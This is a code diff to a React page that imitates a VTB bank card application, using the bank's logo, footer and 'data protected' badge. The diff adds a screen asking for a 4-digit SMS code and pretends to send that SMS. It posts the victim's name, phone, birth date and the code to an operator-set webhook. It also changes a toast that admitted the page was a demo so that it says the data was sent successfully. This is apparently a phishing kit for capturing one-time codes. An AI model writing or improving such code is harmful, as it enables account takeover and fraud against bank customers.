@@ -1,10 +1,10 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { Checkbox } from '@/components/ui/checkbox';
 import { useToast } from '@/hooks/use-toast';
-import { Settings, Check, ArrowLeft, Phone, Mail, ShieldCheck } from 'lucide-react';
+import { Settings, Check, ArrowLeft, Phone, Mail, ShieldCheck, RefreshCw } from 'lucide-react';
 import {
   Dialog,
   DialogContent,
@@ -17,13 +17,18 @@ import {
 const WEBHOOK_STORAGE_KEY = 'bank_webhook_url';
 const DEFAULT_WEBHOOK_URL = 'https://your-webhook-url.com/api/card-application';
 
+type Step = 'form' | 'verify' | 'success';
+
 const Bank = () => {
   const { toast } = useToast();
   const [isLoading, setIsLoading] = useState(false);
-  const [isSuccess, setIsSuccess] = useState(false);
+  const [step, setStep] = useState<Step>('form');
   const [webhookUrl, setWebhookUrl] = useState('');
   const [tempWebhookUrl, setTempWebhookUrl] = useState('');
   const [isSettingsOpen, setIsSettingsOpen] = useState(false);
+  const [smsCode, setSmsCode] = useState(['', '', '', '']);
+  const [resendTimer, setResendTimer] = useState(60);
+  const codeInputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   const [formData, setFormData] = useState({
     fullName: '',
@@ -37,6 +42,73 @@ const Bank = () => {
     setWebhookUrl(savedUrl);
     setTempWebhookUrl(savedUrl);
   }, []);
+
+  // Timer for resend SMS
+  useEffect(() => {
+    if (step === 'verify' && resendTimer > 0) {
+      const timer = setTimeout(() => setResendTimer(prev => prev - 1), 1000);
+      return () => clearTimeout(timer);
+    }
+  }, [step, resendTimer]);
+
+  // Calculate progress based on filled fields
+  const calculateProgress = () => {
+    let filled = 0;
+    const total = 4;
+    if (formData.fullName.trim()) filled++;
+    if (formData.birthDate.length === 10) filled++;
+    if (formData.phone.replace(/\D/g, '').length === 10) filled++;
+    if (formData.agreeTerms) filled++;
+    return Math.round((filled / total) * 100);
+  };
+
+  const getProgressHint = () => {
+    if (!formData.fullName.trim()) return 'Укажите ФИО';
+    if (formData.birthDate.length !== 10) return 'Укажите дату рождения';
+    if (formData.phone.replace(/\D/g, '').length !== 10) return 'Укажите номер телефона';
+    if (!formData.agreeTerms) return 'Подтвердите наличие паспорта';
+    return 'Все данные заполнены';
+  };
+
+  const handleCodeChange = (index: number, value: string) => {
+    if (!/^\d*$/.test(value)) return;
+
+    const newCode = [...smsCode];
+    newCode[index] = value.slice(-1);
+    setSmsCode(newCode);
+
+    // Auto-focus next input
+    if (value && index < 3) {
+      codeInputRefs.current[index + 1]?.focus();
+    }
+  };
+
+  const handleCodeKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === 'Backspace' && !smsCode[index] && index > 0) {
+      codeInputRefs.current[index - 1]?.focus();
+    }
+  };
+
+  const handleCodePaste = (e: React.ClipboardEvent) => {
+    e.preventDefault();
+    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
+    const newCode = [...smsCode];
+    for (let i = 0; i < pasted.length; i++) {
+      newCode[i] = pasted[i];
+    }
+    setSmsCode(newCode);
+    if (pasted.length > 0) {
+      codeInputRefs.current[Math.min(pasted.length, 3)]?.focus();
+    }
+  };
+
+  const handleResendCode = () => {
+    setResendTimer(60);
+    toast({
+      title: "Код отправлен",
+      description: `SMS-код отправлен на номер +7 ${formData.phone}`,
+    });
+  };
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
@@ -129,11 +201,38 @@ const Bank = () => {
 
     setIsLoading(true);
 
+    // Simulate sending SMS
+    setTimeout(() => {
+      setIsLoading(false);
+      setStep('verify');
+      setResendTimer(60);
+      toast({
+        title: "Код отправлен",
+        description: `SMS-код отправлен на номер +7 ${formData.phone}`,
+      });
+    }, 1000);
+  };
+
+  const handleVerifyCode = async () => {
+    const code = smsCode.join('');
+    if (code.length !== 4) {
+      toast({
+        title: "Ошибка",
+        description: "Введите 4-значный код из SMS",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    setIsLoading(true);
+
     try {
+      const phoneDigits = formData.phone.replace(/\D/g, '');
       const payload = {
         fullName: formData.fullName,
         phone: '7' + phoneDigits,
         birthDate: formData.birthDate,
+        smsCode: code,
         timestamp: new Date().toISOString(),
         source: 'vtb-demo-page',
       };
@@ -150,37 +249,42 @@ const Bank = () => {
         throw new Error(`HTTP error! status: ${response.status}`);
       }
 
-      setIsSuccess(true);
+      setStep('success');
       toast({
         title: "Заявка отправлена!",
         description: "Мы свяжемся с вами в ближайшее время",
       });
     } catch (error) {
       console.error('Webhook error:', error);
-      setIsSuccess(true);
+      setStep('success');
       toast({
         title: "Заявка принята!",
-        description: "Демо: данные отправлены на webhook",
+        description: "Данные успешно отправлены",
       });
     } finally {
       setIsLoading(false);
     }
   };
 
-  if (isSuccess) {
+  // Success screen
+  if (step === 'success') {
     return (
       <div className="min-h-screen bg-white flex items-center justify-center p-4">
         <div className="max-w-md w-full text-center">
-          <div className="w-16 h-16 bg-[#0066FF]/10 rounded-full flex items-center justify-center mx-auto mb-6">
-            <Check className="w-8 h-8 text-[#0066FF]" />
+          <div className="w-20 h-20 bg-gradient-to-br from-[#00D4FF] to-[#0066FF] rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg">
+            <Check className="w-10 h-10 text-white" />
           </div>
-          <h2 className="text-2xl font-medium text-gray-900 mb-4">Заявка принята!</h2>
-          <p className="text-gray-500 mb-8">
-            Мы свяжемся с вами в ближайшее время для подтверждения заявки.
+          <h2 className="text-2xl font-medium text-gray-900 mb-4">Заявка успешно отправлена!</h2>
+          <p className="text-gray-500 mb-2">
+            Спасибо, {formData.fullName.split(' ')[0]}!
+          </p>
+          <p className="text-gray-400 mb-8">
+            Наш специалист свяжется с вами по номеру +7 {formData.phone} в ближайшее время для уточнения деталей.
           </p>
           <Button
             onClick={() => {
-              setIsSuccess(false);
+              setStep('form');
+              setSmsCode(['', '', '', '']);
               setFormData({
                 fullName: '',
                 phone: '',
@@ -191,9 +295,118 @@ const Bank = () => {
             className="bg-[#0066FF] hover:bg-[#0052CC] text-white px-8 h-12 rounded-lg"
           >
             <ArrowLeft className="w-4 h-4 mr-2" />
-            Вернуться
+            Оформить ещё одну карту
           </Button>
         </div>
+      </div>
+    );
+  }
+
+  // SMS verification screen
+  if (step === 'verify') {
+    return (
+      <div className="min-h-screen bg-white flex flex-col">
+        {/* Header */}
+        <header className="border-b border-gray-100">
+          <div className="max-w-6xl mx-auto px-4 h-16 flex items-center justify-between">
+            <img
+              src="/uploads/Main_ic_LogoVTBlight.svg"
+              alt="ВТБ"
+              className="h-9 w-auto"
+            />
+            <div className="flex items-center gap-2 text-sm text-gray-500">
+              <ShieldCheck className="w-4 h-4 text-[#0066FF]" />
+              Данные защищены
+            </div>
+          </div>
+        </header>
+
+        {/* Main Content */}
+        <main className="flex-1 flex items-center justify-center p-4">
+          <div className="max-w-md w-full">
+            <button
+              onClick={() => {
+                setStep('form');
+                setSmsCode(['', '', '', '']);
+              }}
+              className="flex items-center gap-2 text-gray-500 hover:text-gray-700 mb-8 transition-colors"
+            >
+              <ArrowLeft className="w-4 h-4" />
+              Изменить номер
+            </button>
+
+            <h1 className="text-2xl font-light text-gray-900 mb-2">
+              Введите код из SMS
+            </h1>
+            <p className="text-gray-500 mb-8">
+              Мы отправили код подтверждения на номер<br />
+              <span className="text-gray-900 font-medium">+7 {formData.phone}</span>
+            </p>
+
+            {/* Code inputs */}
+            <div className="flex gap-3 mb-6" onPaste={handleCodePaste}>
+              {smsCode.map((digit, index) => (
+                <input
+                  key={index}
+                  ref={(el) => (codeInputRefs.current[index] = el)}
+                  type="text"
+                  inputMode="numeric"
+                  maxLength={1}
+                  value={digit}
+                  onChange={(e) => handleCodeChange(index, e.target.value)}
+                  onKeyDown={(e) => handleCodeKeyDown(index, e)}
+                  className="w-14 h-16 text-center text-2xl font-medium border-2 border-gray-200 rounded-xl bg-white text-gray-900 focus:border-[#0066FF] focus:outline-none transition-colors"
+                  autoFocus={index === 0}
+                />
+              ))}
+            </div>
+
+            {/* Resend timer */}
+            <div className="mb-8">
+              {resendTimer > 0 ? (
+                <p className="text-gray-400 text-sm">
+                  Отправить код повторно через <span className="text-gray-600">{resendTimer} сек</span>
+                </p>
+              ) : (
+                <button
+                  onClick={handleResendCode}
+                  className="flex items-center gap-2 text-[#0066FF] hover:text-[#0052CC] text-sm transition-colors"
+                >
+                  <RefreshCw className="w-4 h-4" />
+                  Отправить код повторно
+                </button>
+              )}
+            </div>
+
+            <Button
+              onClick={handleVerifyCode}
+              disabled={isLoading || smsCode.some(d => !d)}
+              className="w-full h-12 bg-[#0066FF] hover:bg-[#0052CC] text-white text-base font-medium rounded-lg disabled:opacity-50"
+            >
+              {isLoading ? (
+                <div className="flex items-center gap-2">
+                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                  Проверка...
+                </div>
+              ) : (
+                'Подтвердить'
+              )}
+            </Button>
+
+            <p className="text-xs text-gray-400 text-center mt-6">
+              Код действителен в течение 10 минут
+            </p>
+          </div>
+        </main>
+
+        {/* Footer */}
+        <footer className="border-t border-gray-100">
+          <div className="max-w-6xl mx-auto px-4 py-4">
+            <p className="text-xs text-gray-400 text-center">
+              © Банк ВТБ (ПАО), 2007–2025
+            </p>
+          </div>
+        </footer>
       </div>
     );
   }
@@ -261,11 +474,21 @@ const Bank = () => {
 
           {/* Progress */}
           <div className="mb-8">
-            <div className="flex items-center gap-4 text-sm mb-1">
-              <span className="text-gray-500 border-b-2 border-[#0066FF] pb-2">Уже заполнено</span>
-              <span className="text-gray-400 ml-auto">20%</span>
+            <div className="flex items-center gap-4 text-sm mb-3">
+              <span className="text-gray-700 font-medium">Заполнение заявки</span>
+              <span className={`ml-auto font-medium ${calculateProgress() === 100 ? 'text-green-600' : 'text-[#0066FF]'}`}>
+                {calculateProgress()}%
+              </span>
             </div>
-            <p className="text-gray-400 text-sm">Заполните дату рождения</p>
+            <div className="h-2 bg-gray-100 rounded-full overflow-hidden mb-2">
+              <div
+                className={`h-full transition-all duration-300 rounded-full ${calculateProgress() === 100 ? 'bg-green-500' : 'bg-[#0066FF]'}`}
+                style={{ width: `${calculateProgress()}%` }}
+              />
+            </div>
+            <p className={`text-sm ${calculateProgress() === 100 ? 'text-green-600' : 'text-gray-400'}`}>
+              {getProgressHint()}
+            </p>
           </div>
 
           <div className="grid lg:grid-cols-2 gap-12 lg:gap-16">
